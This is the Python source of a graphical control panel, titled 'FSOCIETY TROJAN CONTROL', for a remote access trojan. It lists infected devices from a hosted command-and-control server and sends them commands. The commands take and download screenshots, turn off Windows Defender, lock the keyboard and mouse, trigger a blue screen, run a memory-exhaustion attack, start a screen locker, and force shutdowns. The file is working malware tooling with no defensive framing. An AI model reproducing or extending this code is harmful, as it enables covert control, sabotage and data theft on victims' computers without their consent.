import flet as ft
import requests
import threading
import time

SERVER_URL = "https://trojan-server-h7za.onrender.com"
CHAT_ID = "8657607900"
selected_device = CHAT_ID

def main(page: ft.Page):
    page.title = "FSOCIETY"
    page.bgcolor = "#0a0a0a"
    page.padding = 10
    page.theme_mode = ft.ThemeMode.DARK
    page.scroll = ft.ScrollMode.AUTO
    
    # ASCII Header
    header = ft.Text(
        "┌─────────────────────────────────┐\n"
        "│  ███████╗███████╗ ██████╗ ██╗   │\n"
        "│  ██╔════╝██╔════╝██╔═══██╗██║   │\n"
        "│  ███████╗███████╗██║   ██║██║   │\n"
        "│  ╚════██║╚════██║██║   ██║██║   │\n"
        "│  ███████║███████║╚██████╔╝██║   │\n"
        "│  ╚══════╝╚══════╝ ╚═════╝ ╚═╝   │\n"
        "│         TROJAN CONTROL          │\n"
        "└─────────────────────────────────┘",
        color="#00ff00", size=8, font_family="Courier", text_align=ft.TextAlign.CENTER
    )
    page.add(header)
    
    # STATUS
    status = ft.Text("> STATUS: OFFLINE", color="#ff0000", size=12, font_family="Courier", weight=ft.FontWeight.BOLD)
    page.add(status)
    
    # DEVICE SELECT
    device_dropdown = ft.Dropdown(width=200, hint_text="SELECT TARGET", bgcolor="#0a0a0a", color="#00ff00", border_color="#00ff00")
    refresh_btn = ft.TextButton("[ REFRESH ]", on_click=lambda e: load_devices())
    page.add(ft.Row([ft.Text("> TARGET:", color="#00ff00", size=10, font_family="Courier"), device_dropdown, refresh_btn], spacing=5))
    
    # LOG
    log_title = ft.Text("> LOG", color="#00ff00", size=10, font_family="Courier")
    page.add(log_title)
    log_box = ft.Column(scroll=ft.ScrollMode.AUTO, height=100, spacing=2)
    page.add(ft.Container(content=log_box, bgcolor="#050505", border=ft.border.all(1, "#00ff00"), border_radius=3, padding=5))
    
    def add_log(msg, ok=True):
        t = time.strftime("%H:%M:%S")
        color = "#00ff00" if ok else "#ff0000"
        log_box.controls.append(ft.Text(f"[{t}] {'✓' if ok else '✗'} {msg}", color=color, size=8, font_family="Courier"))
        if len(log_box.controls) > 15:
            log_box.controls.pop(0)
        page.update()
    
    # FUNCTIONS
    def load_devices():
        def get():
            nonlocal selected_device
            try:
                r = requests.get(f"{SERVER_URL}/clients", timeout=5)
                if r.status_code == 200:
                    clients = r.json()
                    if clients:
                        opts = [ft.dropdown.Option(cid) for cid in clients.keys()]
                        device_dropdown.options = opts
                        if opts:
                            device_dropdown.value = opts[0].text
                            selected_device = opts[0].text
                            status.value = "> STATUS: ONLINE"
                            status.color = "#00ff00"
                            add_log(f"Connected: {len(clients)} devices", True)
                    else:
                        status.value = "> STATUS: OFFLINE"
                        status.color = "#ff0000"
                        add_log("No devices found", False)
                else:
                    status.value = "> STATUS: OFFLINE"
                    status.color = "#ff0000"
                    add_log("Server error", False)
            except:
                status.value = "> STATUS: OFFLINE"
                status.color = "#ff0000"
                add_log("Server unreachable", False)
            page.update()
        threading.Thread(target=get).start()
    
    def send_cmd(cmd_name, cmd_value):
        if not selected_device:
            add_log("No target selected", False)
            return
        add_log(cmd_name, True)
        status.value = f"> EXEC: {cmd_name}"
        status.color = "#ffff00"
        page.update()
        def send():
            try:
                r = requests.post(f"{SERVER_URL}/cmd/{selected_device}", data=cmd_value, timeout=10)
                if r.status_code == 200:
                    status.value = "> STATUS: ONLINE"
                    status.color = "#00ff00"
                    add_log(f"{cmd_name} - OK", True)
                else:
                    status.value = "> STATUS: ERROR"
                    status.color = "#ff0000"
                    add_log(f"{cmd_name} - FAIL ({r.status_code})", False)
            except:
                status.value = "> STATUS: OFFLINE"
                status.color = "#ff0000"
                add_log(f"{cmd_name} - SERVER OFFLINE", False)
            page.update()
        threading.Thread(target=send).start()
    
    # KNOBS (2 PER ROW)
    btns = [
        ("[ SCREENSHOT ]", "/screenshot"),
        ("[ DOWNLOAD ]", "download"),
        ("[ MONITOR OFF ]", "/monitoroff"),
        ("[ HELLO FRIEND ]", "/msghello"),
        ("[ BIG CURSOR ]", "/bigcursor"),
        ("[ DEFENDER OFF ]", "/disableav"),
        ("[ LOCK SCREEN ]", "/lock"),
        ("[ MOUSE LOCK ]", "/mouselock"),
        ("[ MOUSE UNLOCK ]", "/mouseunlock"),
        ("[ KEY LOCK ]", "/keylock"),
        ("[ KEY UNLOCK ]", "/keyunlock"),
        ("[ SHUTDOWN 5S ]", "/shutdown5"),
        ("[ RESTART 5S ]", "/restart5"),
        ("[ RAM ATTACK ]", "/ramstart"),
        ("[ RAM STOP ]", "/ramstop"),
        ("[ MINIMIZE ALL ]", "/minimize"),
        ("[ OPEN GDZ ]", "/gdz"),
        ("[ BSOD ]", "/bsod"),
        ("[ WINLOCKER ]", "/winlock"),
    ]
    
    def download_ss(e):
        if not selected_device:
            add_log("No target selected", False)
            return
        add_log("Download screenshot", True)
        status.value = "> DOWNLOADING..."
        status.color = "#ffff00"
        page.update()
        def down():
            try:
                r = requests.get(f"{SERVER_URL}/screenshot/{selected_device}", timeout=15)
                if r.status_code == 200 and r.content:
                    with open(f"ss_{selected_device}.png", "wb") as f:
                        f.write(r.content)
                    add_log("Screenshot saved", True)
                    status.value = "> STATUS: ONLINE"
                    status.color = "#00ff00"
                else:
                    add_log("No screenshot", False)
                    status.value = "> STATUS: ONLINE"
                    status.color = "#00ff00"
            except:
                add_log("Download error", False)
                status.value = "> STATUS: ERROR"
                status.color = "#ff0000"
            page.update()
        threading.Thread(target=down).start()
    
    for i in range(0, len(btns), 2):
        row = ft.Row(alignment=ft.MainAxisAlignment.CENTER, spacing=8)
        for j in range(2):
            if i + j < len(btns):
                text, cmd = btns[i + j]
                if cmd == "download":
                    btn = ft.ElevatedButton(text, on_click=download_ss, bgcolor="#0a0a0a", color="#00ff00", style=ft.ButtonStyle(side=ft.BorderSide(1, "#00ff00")))
                else:
                    btn = ft.ElevatedButton(text, on_click=lambda e, t=text, c=cmd: send_cmd(t, c), bgcolor="#0a0a0a", color="#00ff00", style=ft.ButtonStyle(side=ft.BorderSide(1, "#00ff00")))
                row.controls.append(btn)
        page.add(row)
    
    # FOOTER
    page.add(ft.Text("> fsociety | MR.ROBOT MODE", color="#008800", size=8, text_align=ft.TextAlign.CENTER))
    
    # STATUS CHECK
    def check():
        try:
            r = requests.get(f"{SERVER_URL}/health", timeout=5)
            if r.status_code == 200:
                status.value = "> STATUS: ONLINE"
                status.color = "#00ff00"
            else:
                status.value = "> STATUS: OFFLINE"
                status.color = "#ff0000"
        except:
            status.value = "> STATUS: OFFLINE"
            status.color = "#ff0000"
        page.update()
        threading.Timer(10, check).start()
    
    check()
    load_devices()

ft.app(target=main)